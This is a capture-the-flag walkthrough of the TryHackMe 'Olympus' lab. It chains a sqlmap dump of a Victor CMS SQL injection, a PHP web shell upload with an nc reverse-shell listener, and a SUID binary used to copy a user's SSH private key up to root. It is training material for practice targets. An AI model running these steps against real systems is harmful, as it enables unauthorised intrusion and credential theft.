Olympus

TryHackMe · Medium by Brenno M.

Olympus exploits a SQL Injection in Victor CMS to extract credentials, finds a subdomain chat that allows a web shell upload, and escalates via a SUID binary that copies files, ending at root through an SSH key and a privesc script.

Reconnaissance

Nmap reveals SSH and HTTP. Enumeration finds the ~webmaster directory (Victor CMS) and a subdomain chat.olympus.thm.

nmap -sS -sV -Pn <IP>
echo '<IP> olympus.thm chat.olympus.thm' | sudo tee -a /etc/hosts
gobuster dir -u http://olympus.thm/~webmaster/ -w big.txt

SQL Injection

Victor CMS's search feature is vulnerable to SQLi. With sqlmap we dump the database, revealing users (prometheus, zeus) and pointing at the chat.

sqlmap -r search.req --dbs
sqlmap -r search.req -D olympus --dump

Foothold - upload

In the authenticated chat, upload a PHP web shell (the uploaded filename is stored in the chats table) and trigger the reverse shell.

# upload shell.php via chat -> get file path
curl http://.../uploads/<file>.php
nc -lvnp 4444

Privilege escalation

We find a zeus-SUID binary that copies files; use it to copy zeus's id_rsa and log in over SSH. A privesc PHP script, executed as instructed, yields root.

find / -perm -4000 2>/dev/null
# SUID binary (zeus) -> copy /home/zeus/.ssh/id_rsa
ssh -i id_rsa zeus@<IP>
# run the indicated privesc PHP script -> root
cat /root/root.txt
